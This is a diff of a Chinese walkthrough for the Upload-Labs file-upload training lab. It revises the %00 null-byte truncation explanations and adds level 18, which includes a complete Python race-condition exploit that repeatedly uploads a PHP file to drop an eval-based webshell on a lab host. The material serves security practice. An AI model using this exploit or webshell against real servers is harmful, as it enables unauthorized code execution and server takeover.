@@ -389,9 +389,11 @@ $img_path变量的值做了一个拼接，使用前端通过GET方式传来的sa
 
 简单介绍一下%00截断绕过的原理：
 
-通过源代码可以知道变量$img_path存储的是拼接的路径和新的文件名，这个变量的值是存储在内存中的，内存中使用十六进制的00来表示变量值的结束位置。save_path的值是可以通过抓包修改的，如果我们把../upload/的值改成../upload/shell.php00，那么这个值传到后端，不论后端代码拼接什么内容，内存读取到00后都会停止，后面的内容就被截断了。
+通过源代码可以知道变量$img_path存储的是拼接的路径和新的文件名，这个变量的值是存储在内存中的，内存中使用十六进制的00来表示变量值的结束位置，php语言以\0表示结束符。
 
-但是需要注意的是，ascii码在内存中用十六进制00表示，，而GET传递的值是在URL中，ascii码的值要转换成URL编码，ascii码0用%00表示。
+save_path的值是可以通过抓包修改的，如果我们把../upload/的值改成../upload/shell.php00，那么这个值传到后端，不论后端代码拼接什么内容，内存读取到00后都会停止，后面的内容就被截断了。
+
+但是需要注意的是，\0在内存中用十六进制00表示，，而GET传递的值是在URL中，\0的值要转换成URL编码，用%00表示。
 
 最终构造的save_path值为../upload/shell.php%00
 
@@ -440,9 +442,9 @@ if(in_array($file_ext,$ext_arr)){
 
 这一关的逻辑跟第12关是一样的，只是save_path的值是通过POST的方式传递的。
 
-GET请求中save_path的值在URL中，用ascii码00截断要进行URL编码，用%00表示。
+GET请求中save_path的值在URL中，\0要进行URL编码，用%00表示。
 
-同样，在POST请求中，也需要对ascii码00进行处理。
+同样，在POST请求中，也需要对\0进行处理。
 
 2.截断绕过
 
@@ -450,9 +452,13 @@ BurpSuite抓包找到save_path参数的位置。
 
 ![alt text](/images/image-16.png)
 
-POST传递参数时，不需要使用URL编码，可以直接使用十六进制00表示ascii码0，接下来构造截断路径../upload/shell.php00，此处的00不能手动输入，而是使用占位符预留位置，然后把占位符的十六进制值改成00。
+POST请求不通过URL传递参数，不需要对参数值中的特殊符号进行URL编码。
 
-这里使用#做占位符，然后修改其十六进制值。
+如果在POST参数的值中构造截断路径../upload/shell.php00，此处的00为00本身，不代表十六进制的00，无法实现截断的效果。
+
+这时我们使用占位符预留位置，然后把占位符的十六进制值改成00。
+
+比如使用#做占位符，然后修改其十六进制值。
 
 ![alt text](/images/image-17.png)
 
@@ -468,3 +474,177 @@ POST传递参数时，不需要使用URL编码，可以直接使用十六进制0
 
 3.中国蚁剑连接
 
+# 第14关
+
+
+
+# 第15关
+
+
+
+# 第16关
+
+
+
+# 第17关
+
+
+
+# 第18关
+
+1.分析核心源代码
+
+```php
+$ext_arr = array('jpg','png','gif');
+$file_name = $_FILES['upload_file']['name'];
+$temp_file = $_FILES['upload_file']['tmp_name'];
+$file_ext = substr($file_name,strrpos($file_name,".")+1);
+$upload_file = UPLOAD_PATH . '/' . $file_name;
+
+if(move_uploaded_file($temp_file, $upload_file)){
+    if(in_array($file_ext,$ext_arr)){
+        $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
+        rename($upload_file, $img_path);
+        $is_upload = true;
+    }
+}
+```
+这一关的处理顺序为：上传文件-存储文件-校验文件-删除（校验失败）/重命名（校验成功）
+
+如果我们写一个php文件，在这个文件被存储之后，到校验失败被删除之前，php文件可以通过访问被执行。但是这个时间非常的短，如果上传的是一句话木马，这么短的时间内是无法利用的。
+
+我们可以上传一个生成一句话木马的文件gen.php，执行这个文件会自动创建一个一句话木马文件shell.php。我们短时间内高频次上传gen.php文件，在gen.php文件到被删除之前，我们只要成功访问一次即可生成shell.php脚本。根据源代码的逻辑，新生成的shell.php是不会被校验的。
+
+2.payload脚本
+
+创建payload.py文件，写入以下内容：
+
+```php
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Upload-Labs Pass-18 条件竞争上传脚本
+功能：多线程并发上传木马文件 + 并发访问触发木马，实现条件竞争利用
+环境：Python 3.8 + 无第三方依赖（原生urllib）
+"""
+
+import threading
+import urllib.request
+
+# ===================== 配置区域（可根据实际环境修改） =====================
+# 上传文件的目标URL
+UPLOAD_URL = "http://192.168.100.140/upload-labs-master/Pass-18/index.php"
+# 上传后木马文件的访问地址
+SHELL_URL = "http://192.168.100.140/upload-labs-master/upload/gen.php"
+# =========================================================================
+
+# 全局标志位：标记是否攻击成功
+success = False
+
+
+def upload_file():
+    """
+    上传线程函数：持续并发上传PHP木马文件
+    木马功能：生成一句话木马 shell.php
+    """
+    global success
+    
+    # 构造POST请求分隔符，用于表单上传
+    boundary = b"----WebKitFormBoundary8edb3a432s21e9ac"
+    
+    # 构造上传数据包（纯二进制，避免中文/编码问题）
+    payload = (
+        b"--" + boundary + b"\r\n"
+        b'Content-Disposition: form-data; name="upload_file"; filename="gen.php"\r\n'
+        b"Content-Type: image/jpeg\r\n\r\n"
+        b"<?php file_put_contents('shell.php','<?php @eval($_POST[1]);?>');?>\r\n"
+        b"--" + boundary + b"\r\n"
+        b'Content-Disposition: form-data; name="submit"\r\n\r\n'
+        b"submit\r\n"
+        b"--" + boundary + b"--\r\n"
+    )
+
+    # 请求头信息
+    headers = {
+        "User-Agent": "Mozilla/5.0",
+        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary8edb3a432s21e9ac"
+    }
+
+    # 持续上传直到攻击成功
+    while not success:
+        try:
+            # 构造HTTP请求对象
+            req = urllib.request.Request(
+                url=UPLOAD_URL,
+                data=payload,
+                headers=headers,
+                method="POST"
+            )
+            # 发送请求，超时0.1秒，提升竞争速度
+            urllib.request.urlopen(req, timeout=0.1)
+        except Exception:
+            # 忽略网络异常，继续上传
+            continue
+
+
+def access_shell():
+    """
+    访问线程函数：持续访问上传的木马文件，触发木马执行
+    """
+    global success
+    
+    # 持续访问直到攻击成功
+    while not success:
+        try:
+            # 访问木马地址，超时0.1秒
+            response = urllib.request.urlopen(SHELL_URL, timeout=0.1)
+            
+            # 状态码200表示访问成功，木马已执行
+            if response.getcode() == 200:
+                print("\n[+] 条件竞争成功！shell.php 已生成！")
+                success = True
+                return
+        except Exception:
+            # 访问失败则继续重试
+            continue
+
+
+if __name__ == "__main__":
+    print("[*] 正在启动高并发条件竞争攻击...")
+    print("[*] 上传线程：60个 | 访问线程：40个")
+
+    # 启动 60 个并发上传线程
+    for _ in range(60):
+        t_upload = threading.Thread(target=upload_file, daemon=True)
+        t_upload.start()
+
+    # 启动 40 个并发访问线程
+    for _ in range(40):
+        t_access = threading.Thread(target=access_shell, daemon=True)
+        t_access.start()
+
+    # 主线程保持运行，直到攻击成功
+    while not success:
+        pass
+```
+
+该脚本专为Upload-Labs Pass-18关卡设计，用于利用条件竞争上传漏洞，无需第三方依赖，适配Python 3.8及以上版本，兼容多平台。其核心是通过多线程并发，抓住服务器保存上传文件到删除文件的极短时间窗口，触发木马执行并生成后门。
+
+脚本包含两个核心函数：upload_file()负责持续上传gen.php木马文件，构造合规数据包反复发送；access_shell()持续访问该文件，检测到200状态码即说明触发成功，自动生成shell.php后门。
+
+脚本采用高并发设计，启动60个上传线程和40个访问线程提升成功率，运行后会提示攻击状态，出现成功提示即代表漏洞利用完成，可通过shell.php连接工具控制服务器。
+
+3.中国蚁剑连接
+
+
+# 第19关
+
+
+
+
+# 第20关
+
+
+
+
+# 第21关
